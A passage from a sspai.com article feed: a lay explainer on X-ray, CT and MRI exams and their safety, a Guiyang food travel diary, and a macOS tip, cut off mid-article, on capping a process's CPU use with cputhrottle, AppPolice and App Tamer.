线成像，但它不将图像呈现在胶片、影像板和平板探测器中，而是直接呈现在荧光屏上实时观测。下图为胸部后前位 X 线图像，可以看出胸部所有的组织结构都叠加在图像中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/2003777d7a9588dcfb5d0b9ec4d91831\"><figcaption>图片来源于人卫第九版医学影像学</figcaption></figure><p>利用人体组织自然的厚度密度对比进行成像是自然成像，在自然的成像「看不清」的时候，可以通过对比剂（也称造影剂）来人工增加对比，比如高中化学题里常常出现的口服钡餐进行胃肠道 X 线摄影，以及目前临床上飞速发展的介入手术所应用的血管造影。</p>\n<p>X 线拍摄方便，成本较低，单部位平片百元左右，成像显示的范围较大（如上图一张片子整个胸部都能看到）。缺点是作为叠加图像，多层组织的成像叠加可能影响对病变的判断，对于一些细微的病变难以检查出来。另外由于组织的特性和 X 线的成像原理，X 线的应用范围有限：如临床上 X 线平片在腹部应用较少，一般仅应用于急腹症、结石的初筛等；随着内镜技术的发展，钡餐检查应用也有所减少。</p>\n<h3>计算机体层成像——CT</h3>\n<p>CT 是 X 线计算机体层成像的缩写，从全称可以看出，CT 也是利用 X 线成像技术的一种。CT 和普通 X 线的最大区别，就在体层二字。用粗暴的方式来解释，X 线是无数的层叠加出一张图像，而 <strong>CT 是真正的断层图像</strong>，也就是把被扫描的部位的多个层面都分别进行成像——打个比方，<strong>你是一条法棍</strong>（或者火锅店的冻肉条），又硬又长，我们想看看你里面长什么样子，于是搞来一台机器把你从头到脚一片一片切成薄片，这样就能看到<strong>每一个薄片截面长成什么样子</strong>——此时，各个层面的图像都没有其他层面的影响，能够清晰地观察单个层面的组织结构和病变。</p>\n<p>这大概就是医学影像学检查的意义：不用把你真的切开就能看清该切开才能看到的地方，把原来只能通过望闻问切体格检查间接「推断」出来的毛病直接「展示」出来。</p>\n<p>CT 成像是数字化重现图像，其分辨率较 X 线高（具体不同设备和处理技术像素不同），同时 CT 成像的密度值是可量化的，不仅可以用高中低密度来描述图像，也可以用 CT 值来直接描述密度。CT 通常采用横轴面断层成像（就是腰斩的那个层面，法棍啥层面这个就是啥层面），所以大家平时看见的 CT 片总是一个一个的椭圆形图像（如下图右）。但在头面部或颅脑 CT 检查时，有时增加一个冠状层面扫描（竖着劈成前后两半的大平面），就是躺下来，平着开始片片儿，这样能把脑袋该切的每个方向都切开看清。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/8665463654250ed0170dffb34a2fe1cc.png\"><figcaption>图左为人体的轴和面，图源吉林科技出版社人体解剖学；图右为正常肺窗 CT，截取自医学影像学。</figcaption></figure><p>直接利用组织厚度密度不同进行成像的 CT 称为 CT 平扫，通常几分钟内可完成检查。利用对比剂帮助成像的 CT 称为 CT 增强，检查时间略长，根据检查部位及增强技术不同，可能需要数分钟至半小时。随着 CT 技术的发展，「切片」的厚度也越来越薄。螺旋 CT 应用之后，成像可以看成是连续均匀扫描。患者检查后可以取出保存的胶片是选取一定的截面进行打印的，而在应用了最新影像系统的医院，医生可以在电脑上的影像系统中直接观察患者 CT 扫描的每一个层面，如果需要进行进一步的图像处理，还可以在原有扫描的图像上进行一定的「技术处理」，而不需要患者进行二次检查。</p>\n<p>CT 的成像的层面多，分辨率高，价格也就相对较高，其价格通常与扫描部位有关，例如 2021 年某省级最大三甲医院的头颅高分辨螺旋 CT 平扫价格是 198 元，胸部高分辨螺旋 CT 平扫是 378 元，相比普通 X 线经济成本较高。医生在 X 线和 CT 两者之间进行选择时，会根据患者的病情、病变部位、经济情况等情况进行权衡。所以在 X 线检查可能「看不清」的情况下，有可能会建议患者行 CT 检查一步到位，既减少了 X 线吸收（即避免二次吃线），又不会因为反复检查延误诊治。</p>\n<p>前面讲过 X 线较少应用于腹部疾病诊断，临床工作中对<strong>腹部疾病的初筛首选超声</strong>检查，而<strong>进一步检查多选用 CT 检查</strong>。<a href=\"https://sspai.com/u/yn90jmjq/updates\" target=\"_blank\">@刀客特Leslie</a> 在<a href=\"https://sspai.com/post/66539\" target=\"_blank\">体检项目</a>的文章里也提到过，推荐体检进行肺部 CT 检查。这就是因为一些大小较小的病变在 X 线成像中难以看清，而在 CT 中可以发现一些较早期的病变，从而尽早进行诊治，且在后续治疗中方便进行复查对比。</p>\n<p>大家较为关心的另外一个问题是 X 线成像检查（包括普通 X 线和 CT 检查）的安全性。<strong>X 线成像检查有一定的放射性损伤</strong>，一段时间内的检查次数不宜过于频繁。对于孕产妇、儿童等特殊人群，X 线成像的应用需要更加慎重。一般非特殊必需必要，半年内有怀孕计划的妇女及孕产妇不进行此类检查。对于儿童，非病情需要，尽量少进行此类检查。当然，对于一般成年人，不超剂量不超频率地行利用 X 线成像检查一般对人体是无害的，所吸收的射线会在数天后代谢干净。</p>\n<p>一般来说，进行检查或者陪检时，全程听从工作人员的指挥就没有问题。但本着对自己负责的原则，大家应该知道：若非检查或必须陪检的情况（如患者躁动需要家属协助制动），不要进入检查室，如进入需听从医务人员的指挥并穿好防护铅衣。另外，通常检查室附近会设有分诊、问询处或配备相关工作人员，有什么问题可以先咨询外面的工作人员，不要随意进出检查室。如必须进入检查室请等待检查结束。应用了对比剂检查的被检者，可以在检查结束后多喝水，促进对比剂的代谢。</p>\n<h2>磁共振成像（MRI）</h2>\n<p>磁共振成像就是我们平时所说的核磁检查，也是大众一般情况下所能接触到的较为高大上（贵）的影像学检查。磁共振成像的原理较为复杂，感兴趣的朋友可以自行查阅相关资料进行学习。影像学课本上将磁共振成像的原理分为三个步骤：一，人体 1H 在强外磁场内产生纵向磁化矢量和 1H 进动；二，发射特定频率脉冲（RF 脉冲）引起磁共振现象；三，停止 RF 脉冲后 1H 恢复至原有状态并产生 MR 信号。<sup class=\"ss-footnote\" href=\"\" title=\"人卫第九版医学影像学\" footnote-id=\"2\">2</sup></p>\n<p>看不懂是吗？我们删除专业名词进行粗暴翻译：核磁机器造了一个强烈的外磁场，将被检者置于这一磁场内；同时机器间断发出特定频率的射频脉冲，让人身体里面的 H 原子核进行特定「运动」（产生磁共振现象），脉冲停止后，原子核又恢复原来的状态。机器记录原子核恢复原来状态的时间（称弛豫时间），经过一系列复杂的高科技转换成图像。而你需要知道的其实只有一件事：它没有放射线，它用的是磁场。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/76f53cf752783e379d6af5668fd62e8d\"><figcaption>图为核磁检查仪器，图片来源于飞利浦官网。</figcaption></figure><p>磁共振成像的黑白灰度表示的是组织间不同弛豫时间，由于 1H 在弛豫过程中产生代表不同弛豫时间的 MR 信号，所以磁共振图像中，不同灰度称高低信号。不同组织的弛豫时间不同，磁共振成像以此为原理进行疾病诊断。两种不同的弛豫时间产生的信号称为 T1、T2 信号，其具体高低信号的含义内容非常复杂，当然对于普通读者来说也不需要了解，知道有这么两种信号就足够了。</p>\n<p>磁共振成像也是<strong>断层图像</strong>，但不同于 CT，磁共振成像可以进行多层面成像：即 CT 一般是横轴断面（腰斩），而核磁可以进行各个角度的断面成像（随便切）。核磁能进行多参数、多序列成像，对软组织分辨率很高，在<strong>颅脑应用较多</strong>。另外，核磁可以直接利用人体中的水和血液等进行成像，不需要注射对比剂，避免了碘对比剂的副作用。由于磁共振成像是利用外磁场和 RF 脉冲使人体自身的原子核产生磁共振现象来成像的，所以一般被认为是安全性高、无副作用的检查。核磁检查虽然有诸多优点，但也并不是万能的。由于其成像原理和多序列扫描，完成检查需要较长时间（不同检查略有不同，约 1-2 小时），抽搐、躁动、神志不清、幽闭恐惧症等因为种种原因「躺不住」的患者难以行此检查。此外其检查时间过长，不适于急诊。</p>\n<p>接下来，我们聊聊 MRI 的安全问题——</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/8b16ee29e5186dd2f97ea4878888dd22.png\"><figcaption>病床被吸进 MRI 机器，图源：AAMC 发布的 MRI 安全教程课件</figcaption></figure><p>从原理上，核磁成像过程中没有应用到放射线，也就不存在大家所担心的吃线问题，可以说是一个「安全」的检查。但很不幸，临床上磁共振成像往往是事故多发地。倒不是由于检查本身有什么危害，而是因为<strong>检查前的安全措施</strong>没有做好。磁共振成像时有一强大的外磁场，对金属有很大的吸引力，所以在检查时一定要将身上的金属物品（包括但不限于钥匙、饰品、眼镜、钢笔、硬币、活动性义齿等）<strong>全部取出</strong>，有心脏起搏器、磁性金属材质义齿和关节、钢钉、钢板、螺钉支架、节育环等植入的患者不能行此检查。</p>\n<p>另外单独说一下近年来广为使用的钛合金植入物：由于植入物的大小、位置以及植入物的成分（纯钛 / 钛合金，某些钛合金植入物的合金成分和比例是保密专利）不同，其对核磁成像的影响也不同。一般认为，钛合金植入物是非磁性的，不影响核磁检查的安全性，但其会产生伪影，影响检查的效果。也就是说，一般来说钛合金可以做核磁，但是做了可能因为这个附近是看不清的。具体能不能做，请以主治医师、负责植入物的医师、影像科医师的说法为准。<strong>不要图省事或者其他原因隐瞒病史！</strong>以前就发生过整个轮椅带着人直接咣一下吸到了核磁机器上，几千万的机器（是真的这么贵）当场报废的悲剧。不知道那位患者是什么原因直接坐着轮椅就进入了检查室，也不知道这件事后续如何处理，但咣一下被吸到机器上一定对患者造成了人身伤害，其他的患者也因为机器故障而延误了检查。所以请大家在做核磁检查或者作为陪护进入核磁检查室时，一定注意<strong>听话！别带金属！别带一切金属 NOOOOOOO！</strong></p>\n<h2>总结</h2>\n<p>不同影像学检查的使用范围不同，影像学检查的选择是极其复杂的。即便是同一种疾病，其病变的不同时期，需要进行的检查可能都不尽相同；更不用说考虑到病情的复杂多样、个体的差异（患者的一般状态，是否合并其他疾病，是否存在其他检查的禁忌症）和其他复杂的现实条件（患者的性别、年龄、文化、信仰、个人和家属的意愿、家庭经济条件和医保情况、医院的设备技术水平等等等等）。</p>\n<p>或许你读完之后仍旧对这些检查的具体原理一头雾水，这非常正常。一个经过至少五年本科学习、拿了医师证又经过规培又在临床上摸爬滚打的医生，在进行非本专业病种的诊治时，尚且需要会诊，外行就更别说了，不信找个物理专业的朋友来看看我上面写的原理，看他想打我不。所以，专业的事情交给专业的人去做，读者需要明白「做检查是为什么」和「我在做检查的时候应该如何配合、应该怎么保护自己」就很好了。另外叮嘱一句，就诊过的资料（包括但不限于病历、门诊本、化验单等）一定好好保存，<strong>影像学检查的片子请平铺存放</strong>，不要卷起不要对折更不要扔了。</p>\n<p>最后祝你，身体健康。</p>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/66539\" target=\"_blank\">年轻人的体检指南 01：体检在检查什么</a></li>\n<li><a href=\"https://sspai.com/post/66635\" target=\"_blank\">年轻人的体检指南 02：个性化筛查</a></li>\n<li><a href=\"https://sspai.com/post/67410\" target=\"_blank\">亲爱的，我想开启一场有关抑郁症的对话</a></li>\n<li><a href=\"https://sspai.com/post/65177\" target=\"_blank\">让认知成为改变的第一步：年轻人如何远离高血压</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67474"},{"title":"快乐飞旅行报告 05：两天的贵阳都是吃","date":"2021-06-30 06:14:44","description":"\n<p>在 2020 年底，南航推出了快乐飞 2.0，我终于下定决心开启周末全国飞的计划。上半年假期多，南航快乐飞不局限在周末，买它准没错。万万没想到的是疫情再次来袭，一直拖到了今年 3 月底，我才正式出行，好歹也算抓住了快乐飞的下半程。</p>\n<p>本篇是我的快乐飞旅行游记的第五篇，我会以一个系列的形式向大家分享我这三个月的快乐飞旅行见闻，希望大家喜欢。（到最后，如果南航继续推出快乐飞 3.0，我再来做个快乐飞购买总结。）</p>\n<hr>\n<p>改用托尔斯泰的话说，我对贵阳的印象是：发达城市各有各的相似，欠发达城市的原因其来有之。从贵阳龙洞堡机场出来，我和小伙伴打了辆当地的出租车到市区，一上车司机就拒绝导航、一路上光讲方言，到达目的地还多收了六块钱。又是一个第一印象不好的城市。</p>\n<p>贵阳，贵州省会城市。提起贵阳，除了「云上贵州」，脑海中似乎没有什么它的特色亮点，可能是被临近的重庆成都抢了风头。这次来贵阳是和同样是快乐飞的 <a href=\"https://sspai.com/u/lxxk4oyk/updates\" target=\"_blank\">@直树桑</a> 一起（封面图片就是直树的作品），又和生活在贵阳当地的 <a href=\"https://sspai.com/u/Microhoo/updates\" target=\"_blank\">@阿基米虎</a> 网友见面，时间是 4 月 24 日 - 4 月 25 日。</p>\n<h2>真正做咖啡：对的咖啡 &amp; NectarOneCafe</h2>\n<p>小虎推荐了他认为在贵阳认真做咖啡的「DuiDe 对的咖啡」，说让我们一定要去体验。「对的咖啡」开在中山西路地铁口，老式写字楼的一楼，不太起眼，进门隐蔽。但是店内倒是十分宽敞，料理台也是吧台，卡座都可落座，门外玻璃窗前更适合黄昏把杯闲聊。</p>\n<p>时间已到傍晚，招牌冠军拿铁售罄，于是点了 Dirty。问了调配师，确认是冰博克，想来不会太差。不过可能是杯子的原因，大口喝没有双层口感的冲击，奶多咖啡液少，期望过高有点失望。</p>\n<p>内侧的料理台放了好多酒，「对的咖啡」也是白天咖啡晚上酒吧的模式，中间一瓶茅台非常抢镜。注意观察，器皿区域还摆了一把铜制长柄咖啡壶，正是我在武汉游记里写到的制作土耳其咖啡的专用器皿。调配师说他们最近正在研发和土耳其咖啡有关的新品，看来小虎说的没错，这家店确实在认真做咖啡。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/260c87b45242cd385e2885c2db348b62.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/f338c6de047fe2b2d58122a11abb1fa4.jpg\" alt=\"\"></figure><p> </p>\n<p>贵阳老城区的一家 NectarOneCafe，和「对的咖啡」是同一个老板在经营。那一家地段好、风格更网红，生意也好多了。我们在最后一天去机场前，打卡了 NectarOneCafe。</p>\n<p>招牌「金海盐拿铁」，是直树点的，上面一层可食用的金箔，杯子也很特殊，但是听说就是拿铁那味儿（笑）。我点了「冠军的创意」里的「一刻甘甜」，「冠军」说的是这是咖啡师参赛获奖的创意作品，不会踩雷。</p>\n<p>先喝一口上层泡沫，这是用冰块与菠萝、百香果 shake 出来的绵密酸甜，满是菠萝香。再将咖啡液倒入混合，咖啡液量少，因此清淡爽口。菠萝干，酸酸甜甜，咬一口菠萝干，再喝一口饮料，是推荐的饮用方法。总体来说，是我比较满意的水果类创意咖啡。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/95e59e95d3c6059eaed900224bc07803.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/afa06c304f8c593d31f834214f93d6b9.jpg\" alt=\"\"></figure><p> </p>\n<h2>聊语话乡</h2>\n<p>第一天快到入夜，终于和小虎汇合。他带我们去了当地的一家农家菜馆，叫做「聊语话乡」。店内全是当地人，少有游客身影，有大桌好友聚会，也有一家老小五口人来下馆子。</p>\n<p>黔菜，混合了少数民族的饮食特色，又因贵阳靠近重庆成都，辣醇、酸鲜。蕨根拌粉，很是开胃，可惜竟然不辣。毛血旺式的水煮牛肉，辣味竟然也不重。还有一道让我记住的菜是盐菜蒸肉。盐菜，和江浙地区的梅干菜是殊途同归。用青菜晒干腌渍，发霉发黑发干，咸味和鲜味得以保留，用来蒸肉、炒饭、煮汤都很开胃。在老家常能吃到的梅干菜，没想到在贵阳还有「姊妹篇」。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/c728c60e003e30a5569a042e615b2d9f.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/4379add09886bc6ffe059368692e47b1.jpg\" alt=\"\"></figure><p>聊语话乡就在甲秀楼对面，吃完出来下了小坡就是，可直接打卡贵阳为数不多的地标建筑之一。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/08/3209cc39f189d62d8203f6acc3038767.jpg\"></figure><h2>本地奶茶和烤串</h2>\n<p>宜北町，是贵阳本地的奶茶品牌。听小虎说，贵阳年轻一代的集体记忆里有三家本地奶茶店，只这「宜北町」发展出了开遍贵阳的态势。</p>\n<p>宜北町的装修像星巴克那样，在努力打造第三空间的氛围，灯光、家具、氛围，都很适合聊天。贵阳人民似乎特别爱聊天，晚上九点在宜北町的露天桌上，还有大半座位上顾客在谈天说地。</p>\n<p>性价比不高，论口味是比其他奶茶店略胜一筹，但价格溢价太多了，要说花在这氛围上倒真成了奶茶届的「星巴克」了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/08/4fb7521bb2c388ad947e04926e008d2a.jpg\"></figure><p>小蒋辣子鸡火锅，开在民生路。贵阳老市区的特点是，特别是民生路这一带，随便路过一条巷子，左右都会列队各式各样的小吃，这一条街、下一条街都是如此。</p>\n<p>我们来这儿可不是要吃火锅，而是这家的烤串。最好吃的是烤肉筋，小块肉筋，牙签肉的大小穿成串，肥瘦相间，炭火现烤，直到竹签生焦。烤的过程中，要刷上好几遍调料，咸味不免偏重，不过好在辣味、鲜味、香味都很突出，最后撒一把葱花，再等几秒出了葱香就上桌，好吃。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/f7a4402d1af2c23374f5f671aaf4fc3a.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/b8e7400d5d2ad6606a455c1f2d645155.jpg\" alt=\"\"></figure><h2>贵州特色小吃：肠旺面</h2>\n<p>到了第二天，我们正式开始贵阳网红游客食物的探访。</p>\n<p>蔡家街，是一条市井饮食街。自中山东路起通向文笔街的路上，两边星罗棋布各种小吃美食，比如豆沙窝、黄牛肉粉、老酸汤、还有贵阳改良过的臭豆腐等等。罗记肠旺面就开在蔡家街。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/08/7f05fdf39ce199641daf9e4768801fe3.jpg\"></figure><p>肠旺面，贵州特色小吃，可以简单地将它理解成毛血旺加面条😂。用料有大肠、猪血、脆哨、油豆腐，主食手工鸡蛋面，所以看起来与一般的面条不一样，吃起来更筋道。由大肥肉榨干制成的脆哨，吃起来像油渣，但不油腻，反而劲脆，在很多贵州小吃里都能见到脆哨。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/08/bfb49a6ff2ba5f36aeb302bac9317aa4.jpg\"></figure><p>店面一分为二，北边是食用区，南边是料理区，在这儿可以看到煮面全过程。流水线工作，面条一碗一煮，煮好后灌入汤底、肥肠、血旺和脆哨，淋上红油，撒上葱花即可。肠旺面如毛血旺一般香鲜，红而不辣，让我很意外。不过一大早就吃这么油腻的食物，确实有点不太对口。</p>\n<h2>特色黔菜：老凯里酸汤鱼</h2>\n<p>凯里酸汤鱼，贵州凯里黔家菜，是地方特色的酸汤煮鱼。「老凯里酸汤鱼」在贵阳开了诸多店铺，较为出名。酸汤鱼，酸味来自西红柿，口感纯粹清爽，喝多不腻，但也不如海底捞的番茄汤更适入口。鱼肉选了黄腊丁，还可以选江黄鱼，现杀现煮，肉质鲜嫩。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/08/1ae675dd479c9a8e2aa4ca6fe00f7c84.jpg\"></figure><p>不过酸汤鱼的灵魂还靠酸汤蘸水，由五种辣椒制成，加入带有特殊气味的木姜子增香。鱼肉蘸上酸汤蘸水，尝一口舌尖舌中是咸鲜香味，辣到舌两侧再到舌根，直冲喉咙，在滚烫鱼肉的激发下，辣味如排山倒海之势袭来，是一种浑厚的辣。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/08/f608c762c34ed18ed04b51dcb889de63.jpg\"></figure><p>「老凯里酸汤鱼」店里还会循环播放一首洗脑歌曲，歌词似乎是「来贵州 爽贵州 离开贵州想贵州」，就在这样的欢迎氛围中，我们吃完了酸汤鱼。说的「爽」字，你会发现描述贵州最常见的词是「爽爽」。贵州的气候温暖湿润，夏季凉爽，平均气温在 22℃～25℃ 之间，爽爽贵州说的就是凉爽。Apple 把数据中心放在贵州也可以理解了。</p>\n<h2>特色小吃：豆腐圆子</h2>\n<p>豆腐圆子，地方名小吃，现在属「雷家豆腐圆子」最出名。</p>\n<p>做法是豆腐泥加入五香粉料揉成团，再油炸成表皮褐黄，开一小口，填入馅料。豆腐圆子全家福，四枚圆子馅料皆不同，原味、虾仁、酸菜猪肉、香菇鲜肉。外皮的口感像臭豆腐的表皮，带一点豆腐气，但加点蘸水（又是它），灌进馅料也好，蘸点表皮也好，能解了豆腐气，又加上酸辣鲜香的风味。</p>\n<p>不过看着豆腐圆子个头不算小，但里面的馅料竟然意外地干瘪，让这豆腐圆子看起来像是美食节摊位上「虚张声势」的小吃了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/08/eca21e28c08769276b04cabb9167dcbd.jpg\"></figure><h2>名称和吃法都很独特：丝娃娃</h2>\n<p>丝娃娃，也是贵阳传统特色小吃，本质是素春卷，即面皮卷素菜丝。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/08/f17f077bb792f9cf5a872353b4bfc7a8.jpg\"></figure><p>「杨姨妈丝娃娃」也在贵阳开了很多分店，素菜丝有 12 样，包括豆芽、海带、折耳根、香菜、鸡蛋面、土豆丝、黄瓜丝等，红黄白黑各种颜色都有。丝娃娃的取名来自它的吃法，要将面皮和素菜丝卷成卷，露出蔬菜，看起来像个娃娃的襁褓。听起来挺瘆人的，还得把这「襁褓」给吃了。</p>\n<p>素菜卷没有味道，全靠汤料增添风味。汤底是是生姜、大蒜煮的老原汤，加麻油、醋、香油、木姜子油、花生碎和辣椒面。把这蘸水舀一勺倒一点素菜卷里即可食用，素菜脆嫩，酸辣爽口。</p>\n<p>「杨姨妈丝娃娃」用的是手工面皮，肉眼可见的薄，当然容易有漏缝，特别容易漏汤湿手。后来直树说了一个不漏汤又好吃的办法，那就是捞蘸水的时候捞料不捞汤，确实受用。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/83506a6ad4f53cca3297d6c9d67aaacb.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/05/08/2b40612de4f27237d1f190b12d13abf2.jpg\" alt=\"\"></figure><p>时间已经是下午三点，店里没什么客人。店员一看我们是外地游客，非常热心地帮我们调汤料，教授吃法，好评。</p>\n<h2>小结</h2>\n<p>时间太短，来贵州只有两天时间，只能在贵阳转转，找些特色小吃。如果时间充足，其实我更想去千户苗寨住上一晚，体验苗族人民的有趣生活，希望以后有机会再去吧。</p>\n<p>隐藏玩法：从杭州萧山机场出发，可以在国内出发 9 号门附近的中国邮政盖到邮戳以及两枚萧山机场纪念章。但是贵阳龙洞堡机场没有设立中国邮政，只能去市区的邮政局敲章，而且需要注意的是可能必须使用现金支付邮票。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/08/c1bf8fd0fad0c474b58ffad57fd9af2f.jpg\"></figure><p>出行费用：本次贵阳两日游共计花费 728.9 元。</p>\n<hr>\n<ul>\n<li><a href=\"https://sspai.com/post/66203\" target=\"_blank\">快乐飞旅行报告 01：广州的早茶可以从早喝到晚</a></li>\n<li><a href=\"https://sspai.com/post/66285\" target=\"_blank\">快乐飞旅行报告 02：除了武汉特色小吃，还有惬意的土耳其咖啡店</a></li>\n<li><a href=\"https://sspai.com/post/66445\" target=\"_blank\">快乐飞旅行报告 03：故宫的花开了</a></li>\n<li><a href=\"https://sspai.com/post/66183\" target=\"_blank\">快乐飞旅行报告 04：我低估了沈阳人民对于「小份」的定义</a></li>\n</ul>\n","link":"https://sspai.com/post/66510"},{"title":"一日一技｜macOS 如何限制进程 CPU 占用","date":"2021-06-30 03:32:37","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<blockquote><p>很早之前大家就发现，macOS 的活动监视器真的就只是一个监视器，并不能像 Windows 的任务管理器那样可由用户手动设置进程的优先级。但当我们真的有这样的需求时，该怎么办呢？</p></blockquote>\n<p>我们知道，其实苹果的 macOS 是一个半开半闭源的操作系统，大致来讲，GUI 部分是闭源的，这也是 macOS 的精髓；核心系统部分（<a href=\"https://github.com/apple/darwin-xnu\">darwin-xnu</a>）是开源的。这使得用户或者说开发者依然有机会进行系统调用，以实现需求——限制某个进程的 CPU 资源占用。</p>\n<p>也许你会好奇，什么人会有这种需求呢？当某些公司强制要求员工们安装「xx 安全软件」并且时不时还在后台疯狂扫描文件吃 CPU，还不准你关闭和卸载的时候，你就有这个需求了。</p>\n<h2>方案一：cputhrottle</h2>\n<p>这个小工具没有 GUI，是个很轻便的命令行工具。从介绍便知：</p>\n<blockquote><p>cputhrottle is a small OS X command-line utility designed to limit the CPU usage of a process to which it attaches.</p></blockquote>\n<p>作者在其官方页面提供了源码下载和编译好的二进制执行文件。原本我以为这种 OS X 时代的软件已经不适用于现在版本的系统了，结果仍然可用，这估计得益于稳定的内核带来的良好兼容性（基本不会有哪个 OS 内核经常改系统调用的）。</p>\n<p>在下载 <a href=\"http://www.willnolan.com/cputhrottle/cputhrottle.gz\">cputhrottle.gz</a> 解压后，我们需要先给予执行权限：</p>\n<pre class=\"language-bash\"><code>chmod +x cputhrottle</code></pre>\n<p>然后就可以直接使用了，第 1 个参数是进程的 pid，第 2 个参数是最大 CPU 占用百分比，假设某安全软件进程 id 为 2333，你只准它最多吃你 1% 的 CPU：</p>\n<pre class=\"language-bash\"><code>sudo ./cputhrottle 2333 1\n\n# 一般来说，你可以用 ps 命令来查看进程的 pid\nps -ef\n# 如果太多了不好找，可以筛选一下，前提是你要知道它可能的名字\nps -ef | grep \"xx 安全软件或者它的英文名 \"</code></pre>\n<p>这样就能保证它又不被杀死，还不拖慢你的电脑，可谓 「求死不得，求生不能」。为了使用方便，我们可以把执行文件放到 <code>/usr/local/bin</code> 目录下面，以后就可以在任意目录下直接执行了：</p>\n<pre class=\"language-bash\"><code>mv cputhrottle /usr/local/bin\n# 以后可作为全局命令使用\nsudo cputhrottle 2333 1</code></pre>\n<p>然而，在执行命令后，由于程序内部是死循环逻辑，所以会占用当前终端。更优雅的做法当然是让它到后台去执行，不影响我们终端的继续使用：</p>\n<pre class=\"language-bash\"><code>sudo cputhrottle 2333 1\n# 执行命令后按下 control 和 Z，以挂起进程，终端会提示如下\n# ^Z\n# [1]  + 12345 suspended  sudo cputhrottle 2333 1\n\n# 然后接着在终端输入 bg，会提示进程继续执行，这样就到后台\nbg\n# [1]  + 12345 continued  sudo cputhrottle 2333</code></pre>\n<p>如果觉得 bg 这种方式比较麻烦，也可直接用 nohup 命令：</p>\n<pre class=\"language-bash\"><code>sudo nohup cputhrottle 2333 1 &amp;</code></pre>\n<p>上述 12345 是举例，它是你执行 cputhrottle 命令的进程 id，当你不再需要限制 2333 进程的 CPU 占用时，可以 kill 掉它：</p>\n<pre class=\"language-bash\"><code>sudo kill 12345</code></pre>\n<h2>方案二：AppPolice</h2>\n<p>上面的方案一比较原始，比较熟悉终端的同学可以试试，适合喜欢自己写命令脚本的配合使用。后面的方案都是带 GUI 的软件了，适合普通用户。</p>\n<p>AppPolice 和 cputhrottle 一样，也是开源的，2016 年的老古董软件了，亲测也可用。在其 GitHub 仓库 <a href=\"https://github.com/AppPolice/AppPolice/releases/tag/v1.1\">下载 dmg</a> 后，安装就能用了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/19/27a4c9274d4763ad515acd0e4e79e4d2.png\"><figcaption>图标还挺有趣的……红蓝应该是 Police 的配色</figcaption></figure><p>运行后可以直接控制每个应用进程的 CPU 占用，最大就是无限制，相比命令工具，的确还是很方便的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/19/d4d0922786f67ebaee1880e460e31831.png\"></figure><h2>方案三：App Tamer</h2>\n<p>此软件不是开源的，并且是付费软件，亲测也可用，从 UI 和功能上面看起来比方案二更成熟一点。安装之后首次打开会提示安装必须的附属工具。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/19/7ff396879063f03b5517b892bbb1bce4.png\"></figure><p>首次使用还有引导页面，做了一些基本功能的介绍。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/19/3c7289b8a8038bef7d21d028473ecf88.png\"></figure><p>其实使用起来和上述的 AppPolice 差不多，都是可以手动限制每一个进程的 CPU 最大占用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/19/cd073760957706a6ac0394f672bf1f8f.png\"></figure><p>并且还提供了全局开关，在不用退出的情况下关闭限制，需要的时候再打开。各种功能也是要丰富得多，但基本上我这一张截图也就体现完了。</p>\n<figure class=\"image ss-img-wrapper\"><img 